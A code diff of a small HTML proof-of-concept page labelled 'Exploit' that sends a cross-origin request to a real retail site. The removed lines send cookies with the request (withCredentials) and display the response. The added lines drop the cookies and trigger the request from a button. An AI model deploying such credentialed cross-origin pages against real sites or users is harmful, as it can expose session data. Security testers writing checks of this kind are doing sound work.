@@ -1,17 +1,20 @@
 <html>
 <body>
   <h1>Exploit</h1>
+  <button id="exploitButton">Click to exploit</button>
   <script>
-    var xhr = new XMLHttpRequest();
-    xhr.open('GET', 'https://www.etsy.com/in-en/market/gift_for_women', true);
-    xhr.withCredentials = true; // Send cookies
-    xhr.onload = function () {
+    document.getElementById('exploitButton').onclick = function () {
+      var xhr = new XMLHttpRequest();
+      xhr.open('GET', 'https://www.etsy.com/in-en/market/gift_for_women', true);
+      xhr.onload = function () {
         if (xhr.status === 200) {
-            console.log('Response:', xhr.responseText); // Sensitive data could be printed here
-            alert('Exploit Successful: ' + xhr.responseText);
+            alert('Response: ' + xhr.responseText); // View the response
+        } else {
+            alert('Failed to exploit. Status: ' + xhr.status);
         }
+      };
+      xhr.send();
     };
-    xhr.send();
   </script>
 </body>
 </html>
